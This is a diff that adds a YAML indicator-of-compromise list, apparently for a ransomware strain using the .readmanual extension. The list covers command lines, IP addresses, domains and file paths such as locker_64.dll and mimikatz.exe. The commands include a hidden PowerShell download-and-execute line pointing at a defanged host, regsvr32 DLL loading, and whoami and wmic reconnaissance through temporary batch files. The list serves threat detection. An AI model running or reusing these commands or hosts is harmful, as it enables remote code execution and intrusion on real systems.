@@ -1,0 +1,40 @@
+file_extension: .readmanual
+command:
+  - C:\Windows\system32\cmd.exe" /c powershell.exe -nop -w hidden -c "IEX ((new-object
+    net.webclient).downloadstring('http://supercombinating[.]com:80/bug3'))
+  - regsvr32  yesc64.dll /i:"/log:c"
+  - regsvr32  locker_64.dll /i:"/log:c"
+  - regsvr32.exe /i c:\Users\<username>\Music\archs64.dll
+  - regsvr32.exe /s "C:\Users\<username>\AppData\Local\Temp\diloay.dll"
+  - C:\Users\<username>\AppData\Local\Google\Chrome\User Data\FileTypePolicies\archs64.dll
+  - regsvr32.exe /i c:\Users\<username>\Music\archs64.dll
+  - regsvr32.exe C:\Users\<username>\Music\archs64 regsvr32.exe /i
+  - '%COMSPEC% /C "whoami"'
+  - '%COMSPEC% /C echo wmic logicaldisk get description,name ^> %SYSTEMDRIVE%\WINDOWS\Temp\CIrmjHmIzofVNjPd.txt
+    > \WINDOWS\Temp\KmsVUcNomePVWphR.bat & %COMSPEC% /C start %COMSPEC% /C \WINDOWS\Temp\KmsVUcNomePVWphR.bat'
+  - '%COMSPEC% /C echo whoami ^> ZSYSTEMDRIVE%\WINDOWS\Temp\pkLneFsUyHywlUwZ.txt >
+    \WINDOWS\Temp\sloKuaTCIYlTTPwM.bat & %COMSPEC% /C start %COMSPEC% /C \WINDOWS\Temp\sloKuaTCIYlTTPwM.bat'
+domain:
+  - 104.244.42.129
+  - 139.60.162.19
+  - 143.110.185.84
+  - 185.162.235.61
+  - 206.189.56.140
+  - 31.13.93.174
+  - 31.13.93.35
+  - 52.204.190.157
+  - felpojdhf8980.cyou
+  - supercombinating.com
+filename:
+  - Keatuxnf.dll
+  - locker_64.dll
+  - niicok.dll
+  - RecoveryManual.html
+  - C:\inetpub\locker_64.dll
+  - C:\Users\<username>\AppData\Local\Temp\diloay.dll
+  - C:\Users\<username>\AppData\Local\Temp\miavan32.dll
+  - C:\Users\<username>\Music\x64\mimikatz.exe
+  - C:\Users\<username>\yesc64.dll
+  - C:\Windows\ar664hs.dll
+  - C:\windows\locker_64.dll
+  - C:\Windows\SysWOW64\exploer.exe
